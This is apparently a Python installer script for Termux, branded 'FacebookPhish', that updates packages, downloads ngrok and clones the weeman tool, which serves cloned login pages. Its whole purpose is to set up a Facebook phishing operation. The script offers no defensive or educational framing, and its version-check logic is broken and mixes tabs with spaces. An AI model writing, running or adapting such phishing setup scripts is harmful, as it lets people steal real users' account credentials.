import os
import sys

def python_ver():


        if sys.version[:3]=="3" or "3.5" in sys.version[:3]:
                        pass #good
        elif sys.version[:3]=="2" or "2.7" in sys.version[:3]:
                print("THIS SCRIPT NEED PYTHON3 TO WORK. PLEASE START THIS WITH COMMAND PYTHON3 FACEBOOKPHISH.PY")
                print("You're running this script with python version", sys.version[:3]=="2" or "2.7")
                sys.exit()
        else:
		if sys.version[:3]=="1" in sys.version[:3]:
			print("Please run this script with pyhton3 to continue...")
			sys.exit()


python_ver()	
		
print ("=========================================")

print(""" _______    ___       ______  _______ .______     ______     ______    __  ___ 
|   ____|  /   \     /      ||   ____||   _  \   /  __  \   /  __  \  |  |/  / 
|  |__    /  ^  \   |  ,----'|  |__   |  |_)  | |  |  |  | |  |  |  | |  '  /  
|   __|  /  /_\  \  |  |     |   __|  |   _  <  |  |  |  | |  |  |  | |    <   
|  |    /  _____  \ |  `----.|  |____ |  |_)  | |  `--'  | |  `--'  | |  .  \  
.______/__/__   \__\ \______||________.______/__ \______/   \______/  |__|\__\ 
|   _  \  |  |  |  | |  |     /       ||  |  |  |                              
|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |                              
|   ___/  |   __   | |  |     \   \    |   __   |                              
|  |      |  |  |  | |  | .----)   |   |  |  |  |                              
| _|      |__|  |__| |__| |_______/    |__|  |__| """)

print("==========================================")


print("\nScript for Termux")
print("Made by Sam Sepiol")
print("==========================================")
#python_ver()
print("\nLet's start, we need to update and install some tools first... ")
include=["Y","N","y","n","yes","no","Yes","No","YES","NO"]
start=input("Do you want to continue? Y/N: ")
while start not in include:
	start=input("You need to choose a valid option (Y, y, N, n, yes, no)")
if start=="N" or start=="n" or start=="no":
	print("Okay, let's try when you want to. Goodbye")
else:
	os.system("pkg update")
	print("==================================")
	print("system updated")
	os.system("pkg upgrade")
	print("==================================")
	print("packages upgraded")
	os.system("pkg install apt")
	print("==================================")
	print("apt installed")
	os.system("apt-get install python2")
	print("==================================")
	print("Python2 installed")
	os.system("apt-get install git")
	print("==================================")
	print("git installed")
	os.system("apt-get install wget")
	print("==================================")
	print("wget installed")
	os.system("cd /data/data/com.termux/files/home && wget  https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip")
	os.system("cd /data/data/com.termux/files/home && unzip ngrok-stable-linux-arm.zip")
	os.system("cd $home && chmod 755 ngrok")
	os.system("cd $home && cp ngrok /data/data/com.termux/files/usr/bin")
	os.system("cd $home && git clone https://github.com/samyoyo/weeman.git")
	os.system("cd /data/data/com.termux/files/home/weeman && chmod 755 weeman.py")
	os.system("pip2 install --upgrade pip ")
	os.system("cd /data/data/com.termux/files/home/")
	os.system("pip2 install beautifulsoup4")
	os.system("cd /data/data/com.termux/files/home/")
